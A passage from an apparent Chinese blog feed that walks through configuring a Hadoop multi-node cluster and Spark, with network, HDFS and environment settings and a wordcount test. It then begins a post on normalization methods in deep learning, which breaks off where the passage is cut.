class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>etc<span class="hljs-regexp">/hadoop/</span>hdfs-site.xml<br></code></pre></div></td></tr></table></figure><p>在之间，输入下列内容:</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-params">&lt;property&gt;</span><br><span class="hljs-params">&lt;name&gt;</span>dfs.replication<span class="hljs-params">&lt;/name&gt;</span> <br><span class="hljs-params">&lt;value&gt;</span><span class="hljs-number">3</span><span class="hljs-params">&lt;/value&gt;</span> <br><span class="hljs-params">&lt;/property&gt;</span><br><span class="hljs-params">&lt;property&gt;</span><br><span class="hljs-params">&lt;name&gt;</span>dfs.datanode.data.dir<span class="hljs-params">&lt;/name&gt;</span> <br><span class="hljs-params">&lt;value&gt;</span>file:<span class="hljs-meta-keyword">/usr/</span>local<span class="hljs-meta-keyword">/hadoop/</span>hadoop_data<span class="hljs-meta-keyword">/hdfs/</span>datanode<span class="hljs-params">&lt;/value&gt;</span> <br><span class="hljs-params">&lt;/property&gt;</span><br></code></pre></div></td></tr></table></figure><h4><span id="3复制data1伺服器至data2-data3-master">3复制data1伺服器至data2、data3、master</span></h4><h4><span id="4设定data2-data3伺服器">4设定data2、data3伺服器</span></h4><p>设定data2固定IP</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">sudo gedit /etc/network/<span class="hljs-built_in">int</span>erfaces<br></code></pre></div></td></tr></table></figure><p>输入下列内容</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"># <span class="hljs-built_in">int</span>erfaces(<span class="hljs-number">5</span>) file used by ifup(<span class="hljs-number">8</span>) <span class="hljs-keyword">and</span> ifdown(<span class="hljs-number">8</span>)<br><span class="hljs-built_in">auto</span> lo<br>iface lo inet loopback<br><br><span class="hljs-built_in">auto</span> eth0<br>iface eth0 inet static<br>address <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.102</span><br>netmask <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span><br>network <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>gateway <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>dns-nameservers <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br></code></pre></div></td></tr></table></figure><p>设定hostname</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/etc/</span>hostname<br></code></pre></div></td></tr></table></figure><p>输入下列内容:</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-keyword">data</span>2<br></code></pre></div></td></tr></table></figure><p>设定data3固定IP</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">sudo gedit /etc/network/<span class="hljs-built_in">int</span>erfaces<br></code></pre></div></td></tr></table></figure><p>输入下列内容</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"># <span class="hljs-built_in">int</span>erfaces(<span class="hljs-number">5</span>) file used by ifup(<span class="hljs-number">8</span>) <span class="hljs-keyword">and</span> ifdown(<span class="hljs-number">8</span>)<br><span class="hljs-built_in">auto</span> lo<br>iface lo inet loopback<br><br><span class="hljs-built_in">auto</span> eth0<br>iface eth0 inet static<br>address <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.103</span><br>netmask <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span><br>network <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>gateway <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>dns-nameservers <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br></code></pre></div></td></tr></table></figure><p>设定hostname</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/etc/</span>hostname<br></code></pre></div></td></tr></table></figure><p>输入下列内容:</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-keyword">data</span>3<br></code></pre></div></td></tr></table></figure><h4><span id="5设定master伺服器">5设定master伺服器</span></h4><p>设定master固定IP</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">sudo gedit /etc/network/<span class="hljs-built_in">int</span>erfaces<br></code></pre></div></td></tr></table></figure><p>输入下列内容</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"># <span class="hljs-built_in">int</span>erfaces(<span class="hljs-number">5</span>) file used by ifup(<span class="hljs-number">8</span>) <span class="hljs-keyword">and</span> ifdown(<span class="hljs-number">8</span>)<br><span class="hljs-built_in">auto</span> lo<br>iface lo inet loopback<br><br><span class="hljs-built_in">auto</span> eth0<br>iface eth0 inet static<br>address <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.100</span><br>netmask <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span><br>network <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>gateway <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>dns-nameservers <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br></code></pre></div></td></tr></table></figure><p>设定hostname</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/etc/</span>hostname<br></code></pre></div></td></tr></table></figure><p>输入下列内容:</p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh"><span class="hljs-literal">master</span><br></code></pre></div></td></tr></table></figure><p>修改hdfs-site.xml</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>etc<span class="hljs-regexp">/hadoop/</span>hdfs-site.xml<br></code></pre></div></td></tr></table></figure><p>在之间，输入下列内容:</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-params">&lt;property&gt;</span><br><span class="hljs-params">&lt;name&gt;</span>dfs.replication<span class="hljs-params">&lt;/name&gt;</span> <br><span class="hljs-params">&lt;value&gt;</span><span class="hljs-number">3</span><span class="hljs-params">&lt;/value&gt;</span> <br><span class="hljs-params">&lt;/property&gt;</span><br><span class="hljs-params">&lt;property&gt;</span><br><span class="hljs-params">&lt;name&gt;</span>dfs.namenode.data.dir<span class="hljs-params">&lt;/name&gt;</span> <br><span class="hljs-params">&lt;value&gt;</span>file:<span class="hljs-meta-keyword">/usr/</span>local<span class="hljs-meta-keyword">/hadoop/</span>hadoop_data<span class="hljs-meta-keyword">/hdfs/</span>namenode<span class="hljs-params">&lt;/value&gt;</span> <br><span class="hljs-params">&lt;/property&gt;</span><br></code></pre></div></td></tr></table></figure><p>设定master档案</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>etc<span class="hljs-regexp">/hadoop/m</span>aster<br></code></pre></div></td></tr></table></figure><p>输入下列内容:</p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh"><span class="hljs-literal">master</span><br></code></pre></div></td></tr></table></figure><p>设定slaves档案</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>etc<span class="hljs-regexp">/hadoop/</span>slaves<br></code></pre></div></td></tr></table></figure><p>输入下列内容:</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-keyword">data</span>1<br><span class="hljs-keyword">data</span>2<br><span class="hljs-keyword">data</span>3<br></code></pre></div></td></tr></table></figure><h4><span id="6master连线至data1-data2-data3建立hdfs目录">6master连线至data1、data2、data3建立HDFS目录</span></h4><p>master SSH连线至data1并建立HDFS目录</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">ssh data1<br><br><span class="hljs-meta"># 删除hdfs目录</span><br>sudo rm -rf <span class="hljs-meta-keyword">/usr/</span>local<span class="hljs-meta-keyword">/hadoop/</span>hadoop_data/hdfs<br><br><span class="hljs-meta"># 创建datanode目录</span><br>sudo mkdir -p <span class="hljs-meta-keyword">/usr/</span>local<span class="hljs-meta-keyword">/hadoop/</span>hadoop_data<span class="hljs-meta-keyword">/hdfs/</span>datanode<br><br><span class="hljs-meta"># 更改所有者为当前用户</span><br>sudo chown ray:ray -R <span class="hljs-meta-keyword">/usr/</span>local/hadoop<br></code></pre></div></td></tr></table></figure><p>回到master端</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-keyword">exit</span><br></code></pre></div></td></tr></table></figure><p>master SSH连线至data2并建立HDFS目录</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">ssh data2<br><br><span class="hljs-meta"># 删除hdfs目录</span><br>sudo rm -rf <span class="hljs-meta-keyword">/usr/</span>local<span class="hljs-meta-keyword">/hadoop/</span>hadoop_data/hdfs<br><br><span class="hljs-meta"># 创建datanode目录</span><br>sudo mkdir -p <span class="hljs-meta-keyword">/usr/</span>local<span class="hljs-meta-keyword">/hadoop/</span>hadoop_data<span class="hljs-meta-keyword">/hdfs/</span>datanode<br><br><span class="hljs-meta"># 更改所有者为当前用户</span><br>sudo chown ray:ray -R <span class="hljs-meta-keyword">/usr/</span>local/hadoop<br></code></pre></div></td></tr></table></figure><p>回到master端</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-keyword">exit</span><br></code></pre></div></td></tr></table></figure><p>master SSH连线至data3并建立HDFS目录</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">ssh data3<br><br><span class="hljs-meta"># 删除hdfs目录</span><br>sudo rm -rf <span class="hljs-meta-keyword">/usr/</span>local<span class="hljs-meta-keyword">/hadoop/</span>hadoop_data/hdfs<br><br><span class="hljs-meta"># 创建datanode目录</span><br>sudo mkdir -p <span class="hljs-meta-keyword">/usr/</span>local<span class="hljs-meta-keyword">/hadoop/</span>hadoop_data<span class="hljs-meta-keyword">/hdfs/</span>datanode<br><br><span class="hljs-meta"># 更改所有者为当前用户</span><br>sudo chown ray:ray -R <span class="hljs-meta-keyword">/usr/</span>local/hadoop<br></code></pre></div></td></tr></table></figure><p>回到master端</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-keyword">exit</span><br></code></pre></div></td></tr></table></figure><h4><span id="7建立与格式化namenodehdfs目录">7建立与格式化NameNodeHDFS目录</span></h4><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-meta"># 删除hdfs目录</span><br>sudo rm -rf <span class="hljs-meta-keyword">/usr/</span>local<span class="hljs-meta-keyword">/hadoop/</span>hadoop_data/hdfs<br><br><span class="hljs-meta"># 创建datanode目录</span><br>sudo mkdir -p <span class="hljs-meta-keyword">/usr/</span>local<span class="hljs-meta-keyword">/hadoop/</span>hadoop_data<span class="hljs-meta-keyword">/hdfs/</span>namenode<br><br><span class="hljs-meta"># 更改所有者为当前用户</span><br>sudo chown ray:ray -R <span class="hljs-meta-keyword">/usr/</span>local/hadoop<br></code></pre></div></td></tr></table></figure><p>格式化NameNode HDFS目录</p><figure class="highlight dos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dos">hadoop namenode -<span class="hljs-built_in">format</span><br></code></pre></div></td></tr></table></figure><h4><span id="8启动hadoop-multi-nodecluster">8启动Hadoop Multi Nodecluster</span></h4><p>启动start-dfs.sh，再启动 start-yarn.sh</p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh"><span class="hljs-literal">start</span>-dfs.sh<br><br><span class="hljs-literal">start</span>-yarn.sh<br></code></pre></div></td></tr></table></figure><p>或 启动全部</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">start</span>-<span class="hljs-keyword">all</span>.sh<br></code></pre></div></td></tr></table></figure><p>查看目前所执行的行程</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">jps</span><br></code></pre></div></td></tr></table></figure><p>停止</p><p>stop-dfs.sh</p><p>stop-yarn.sh</p><p>stop-all.sh</p><h4><span id="9开启hadoopresource-manager-web介面">9开启HadoopResource-Manager Web介面</span></h4><p>http://master:8088/</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/hadoop-spark环境配置_pic/image-20201030010622615.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h4><span id="10开启namenodeweb介面">10开启NameNodeWeb介面</span></h4><p>HDFS Web UI网址 http://master:50070/</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/hadoop-spark环境配置_pic/image-20201030010705348.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/hadoop-spark环境配置_pic/image-20201030010732578.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h3><span id="常用命令">常用命令</span></h3><figure class="highlight dos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dos">hadoop <span class="hljs-built_in">fs</span> -<span class="hljs-built_in">mkdir</span><br>hadoop <span class="hljs-built_in">fs</span> -ls<br>hadoop <span class="hljs-built_in">fs</span> -copyFromLocal # 复制到hdfs，提醒有重名<br>hadoop <span class="hljs-built_in">fs</span> -put   # 复制到hdfs，但是直接覆盖重名<br>hadoop <span class="hljs-built_in">fs</span> -cat<br>hadoop <span class="hljs-built_in">fs</span> -copyToLocal  # 复制到本地，提醒有重名<br>hadoop <span class="hljs-built_in">fs</span> -get   # 复制到本地，但是直接覆盖重名<br>hadoop <span class="hljs-built_in">fs</span> -cp<br>hadoop <span class="hljs-built_in">fs</span> -rm<br></code></pre></div></td></tr></table></figure><h3><span id="pyspark">pyspark</span></h3><h4><span id="scale">scale</span></h4><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">tar xvf scala<span class="hljs-number">-2.11</span><span class="hljs-number">.12</span>.tgz<br><br>sudo mv scala<span class="hljs-number">-2.11</span><span class="hljs-number">.12</span> /usr/local/scala<br><br>sudo gedit .bashrc<br></code></pre></div></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-comment"># 写入</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">SCALA_HOME</span>=/usr/local/scala<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:$SCALA_HOME/bin<br></code></pre></div></td></tr></table></figure><h4><span id="spark">spark</span></h4><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">tar xvf spark<span class="hljs-number">-2.4</span><span class="hljs-number">.7</span>-bin-without-hadoop.tgz <br>sudo mv spark<span class="hljs-number">-2.4</span><span class="hljs-number">.7</span>-bin-without-hadoop /usr/local/spark<br>sudo gedit .bashrc<br></code></pre></div></td></tr></table></figure><p>写入</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">SPARK_HOME</span>=/usr/local/spark<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:$SPARK_HOME/bin:$SPARK_HOME/sbin<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> .bashrc<br></code></pre></div></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">cd</span> /usr/<span class="hljs-keyword">local</span>/spark/<br>cp ./<span class="hljs-keyword">conf</span>/spark-env.<span class="hljs-keyword">sh</span>.template ./<span class="hljs-keyword">conf</span>/spark-env.<span class="hljs-keyword">sh</span><br><br>sudo gedit ./<span class="hljs-keyword">conf</span>/spark-env.<span class="hljs-keyword">sh</span><br></code></pre></div></td></tr></table></figure><p>写入</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">SPARK_DIST_CLASSPATH</span>=$(/usr/local/hadoop/bin/hadoop classpath)<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">HADOOP_CONF_DIR</span>=/usr/local/hadoop/etc/hadoop<br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PYSPARK_PYTHON</span>=/usr/bin/python3<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PYSPARK_DRIVER_PYTHON</span>=/usr/bin/ipython3<br><span class="hljs-comment"># 在notebook中运行pyspark</span><br><span class="hljs-comment"># export PYSPARK_DRIVER_PYTHON_OPTS="notebook"</span><br></code></pre></div></td></tr></table></figure><p>使用HDFS中文件时，先要启动Hadoop</p><h4><span id="测试">测试</span></h4><p>master机器上</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">cd</span> ~<br><span class="hljs-keyword">mkdir</span> wordcount/<span class="hljs-keyword">input</span> -p<br>cp /usr/<span class="hljs-keyword">local</span>/hadoop/LICENSE.txt ~/wordcount/<span class="hljs-keyword">input</span><br></code></pre></div></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">start</span>-<span class="hljs-keyword">all</span>.sh<br></code></pre></div></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">hadoop fs -mkdir -p <span class="hljs-regexp">/user/</span>ray<span class="hljs-regexp">/wordcount/i</span>nput<br>cd ~<span class="hljs-regexp">/wordcount/i</span>nput<br>hadoop fs -copyFromLocal LICENSE.txt <span class="hljs-regexp">/user/</span>ray<span class="hljs-regexp">/wordcount/i</span>nput<br>hadoop fs -ls <span class="hljs-regexp">/user/</span>ray<span class="hljs-regexp">/wordcount/i</span>nput<br></code></pre></div></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> spark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
            <tag> spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神经网络normalization</title>
      <link href="/posts/5de6e8e6.html"/>
      <url>/posts/5de6e8e6.html</url>
      
        <content type="html"><![CDATA[<h1><span id="深度学习中的normalizationbnlnwn">深度学习中的Normalization，BN/LN/WN</span></h1><h2><span id="为什么需要normalization"><strong>为什么需要Normalization</strong></span></h2><ul><li>independent and identically distributed，简称为 <em>i.i.d</em></li></ul><blockquote><p>并非所有机器学习模型的必然要求（比如 Naive Bayes模型就建立在特征彼此独立的基础之上，而Logistic Regression 和 神经网络则在非独立的特征数据上依然可以训练出很好的模型），但独立同分布的数据可以简化常规机器学习模型的训练、提升机器学习模型的预测能力，已经是一个共识。</p></blockquote><ul><li><strong>白化（whitening）</strong></li></ul><blockquote><p>数据预处理步骤。</p><p>（1）<em>去除特征之间的相关性</em> —&gt; 独立；</p><p>（2）<em>使得所有特征具有相同的均值和方差</em> —&gt; 同分布。</p></blockquote><ul><li><strong>深度学习中的 Internal Covariate Shift</strong></li></ul><blockquote><p>参数更新使每一层的数据分布发生变化，向前叠加，高层的受到数据变化的影响，需要不断重新适应底层的数据变化。</p><ul><li><p>Internal Covariate Shift，简称 ICS.</p><blockquote><p>ML经典假设是“源空间（source domain）和目标空间（targetdomain）的数据分布（distribution）是一致的”</p><p>covariateshift是指源空间和目标空间的条件概率是一致的，但是其边缘概率不同</p><p>​ 1. 给定输入，拟合label，条件概率一致的</p><ol start="2" type="1"><li>层间计算导致，各层分布发生改变，边缘概率是不同的</li></ol></blockquote></li><li><p>ICS的问题</p></li></ul><blockquote><ol type="1"><li>上层参数需要不断适应新的输入数据分布，降低学习速度</li><li>下层输入的变化可能趋向于变大或者变小，导致上层落入饱和区，使得学习过早停止(想想sigmoid)</li><li>每层的更新都会影响到其它层，因此每层的参数更新策略需要尽可能的谨慎</li></ol></blockquote></blockquote><h2><span id="normalization的通用框架与基本思想"><strong>Normalization的通用框架与基本思想</strong></span></h2><p>标准的白化操作代价高昂，特别是我们还希望白化操作是可微的（<em>每一点上必存在非垂直切线</em>），保证白化操作可以通过反向传播来更新梯度。</p><p>Normalization 方法退而求其次，进行了简化的白化操作。</p><ul><li><strong>Normalization </strong></li></ul><blockquote><p>先对其做<strong>平移和伸缩变换</strong>， 将 <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bx%7D" srcset="/img/loading.gif" lazyload>的分布规范化成在固定区间范围的标准分布。</p><p><img src="https://www.zhihu.com/equation?tex=h%3Df%5Cleft%28%5Cbold%7Bg%7D%5Ccdot%5Cfrac%7B%5Cbold%7Bx%7D-%5Cbold%7B%5Cmu%7D%7D%7B%5Cbold%7B%5Csigma%7D%7D%2B%5Cbold%7Bb%7D%5Cright%29%5C%5C" srcset="/img/loading.gif" lazyload></p><p><img src="https://www.zhihu.com/equation?tex=%5Cbold%7B%5Cmu%7D" srcset="/img/loading.gif" lazyload>是<strong>平移参数</strong>（shift parameter）， <img src="https://www.zhihu.com/equation?tex=%5Cbold%7B%5Csigma%7D" srcset="/img/loading.gif" lazyload>是<strong>缩放参数</strong>（scale parameter）</p><p><img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bb%7D" srcset="/img/loading.gif" lazyload>是<strong>再平移参数</strong>（re-shift parameter）， <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bg%7D" srcset="/img/loading.gif" lazyload>是<strong>再缩放参数</strong>（re-scale parameter）</p><p>最终得到的数据符合均值为 <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bb%7D" srcset="/img/loading.gif" lazyload> 、方差为 <img src="https://www.zhihu.com/equation?tex=%5Cbold%7Bg%7D%5E2" srcset="/img/loading.gif" 